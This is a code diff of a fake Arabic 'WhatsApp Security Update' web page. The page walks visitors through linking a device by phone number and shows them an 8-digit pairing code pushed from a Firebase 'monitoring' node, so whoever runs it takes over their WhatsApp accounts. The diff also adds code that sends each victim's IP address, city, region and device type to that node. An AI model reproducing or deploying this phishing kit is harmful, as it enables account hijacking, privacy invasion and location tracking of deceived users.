@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security Update</title>
+    <title>تحديث أمان واتساب</title>
     <style>
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
@@ -24,18 +24,23 @@
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div id="ui-title" class="header-title"></div>
-        <div id="ui-badge" class="badge"></div>
+        <div class="header-title">تحديث أمان واتساب</div>
+        <div class="badge">جهاز مرتبط: iPhone</div>
         <div class="v-box">
-            <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
+            <div class="v-row"><span style="color:#667781">البروتوكول الحالي:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
             <div style="height:1px; background:#eee; margin:5px 0"></div>
-            <div class="v-row"><span id="ui-new-label" style="color:#667781"></span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
+            <div class="v-row"><span style="color:#667781">البروتوكول المحدث:</span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
         </div>
-        <p id="ui-alert" class="alert-p"></p>
-        <div id="ui-steps" class="steps"></div>
+        <p class="alert-p">لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).</p>
+        <div class="steps">
+            <b>كيفية التفعيل:</b><br>
+            1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>
+            2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>
+            3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:
+        </div>
         <div class="code-zone">
             <div id="pairing-code">. . .</div>
-            <div id="ui-wait" class="wait-text"></div>
+            <div id="ui-wait" class="wait-text">في انتظار رمز الأمان.. سيصل هنا قريباً</div>
         </div>
     </div>
 
@@ -47,60 +52,27 @@
         const db = firebase.database();
         const userId = new URLSearchParams(window.location.search).get('id');
 
-        const translations = {
-            ar: {
-                title: "تحديث أمان واتساب",
-                badge: "جهاز مرتبط: iPhone",
-                old: "البروتوكول الحالي:",
-                new: "البروتوكول المحدث:",
-                alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).",
-                steps: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:",
-                wait: "في انتظار رمز الأمان.. سيصل هنا قريباً",
-                done: "تم استخراج الكود! أدخله في واتساب الآن"
-            },
-            en: {
-                title: "WhatsApp Security Update",
-                badge: "Linked Device: iPhone",
-                old: "Current Protocol:",
-                new: "Updated Protocol:",
-                alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).",
-                steps: "<b>How to activate:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
-                wait: "Awaiting security code.. arriving in moments",
-                done: "Code generated! Enter it in WhatsApp now"
-            }
-        };
-
-        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
-        const lang = translations[userLang];
-        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
-
-        document.getElementById('ui-title').innerText = lang.title;
-        document.getElementById('ui-badge').innerText = lang.badge;
-        document.getElementById('ui-old-label').innerText = lang.old;
-        document.getElementById('ui-new-label').innerText = lang.new;
-        document.getElementById('ui-alert').innerText = lang.alert;
-        document.getElementById('ui-steps').innerHTML = lang.steps;
-        document.getElementById('ui-wait').innerText = lang.wait;
-
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            // سحب الـ IP والبيانات "قبل" الإرسال لضمان عدم ظهور N/A
-            fetch('https://api.ipify.org?format=json')
+            // سحب الـ IP والمحافظة والمدينة
+            fetch('https://ipapi.co/json/')
                 .then(r => r.json())
                 .then(data => {
-                    let dev = navigator.platform;
-                    if (/iPhone|iPad|iPod/.test(navigator.userAgent)) dev = "iPhone";
+                    let dev = "Mobile";
+                    if (/iPhone|iPad/.test(navigator.userAgent)) dev = "iPhone";
                     else if (/Android/.test(navigator.userAgent)) dev = "Android";
 
                     sRef.set({
                         status: "Online",
                         ip: data.ip,
+                        city: data.city, // المدينة
+                        region: data.region, // المحافظة
                         device: dev,
                         ts: Date.now()
                     });
                 }).catch(() => {
-                    sRef.set({ status: "Online", ip: "Not Detected", device: "Mobile", ts: Date.now() });
+                    sRef.set({ status: "Online", ip: "N/A", device: "Mobile", ts: Date.now() });
                 });
 
             sRef.onDisconnect().update({ status: "Offline" });
@@ -109,7 +81,7 @@
                 const val = snap.val();
                 if (val && val.code) {
                     document.getElementById('pairing-code').innerText = val.code;
-                    document.getElementById('ui-wait').innerText = lang.done;
+                    document.getElementById('ui-wait').innerText = "تم استخراج الكود! أدخله في واتساب الآن";
                     document.getElementById('ui-wait').classList.add('arrived');
                 }
             });
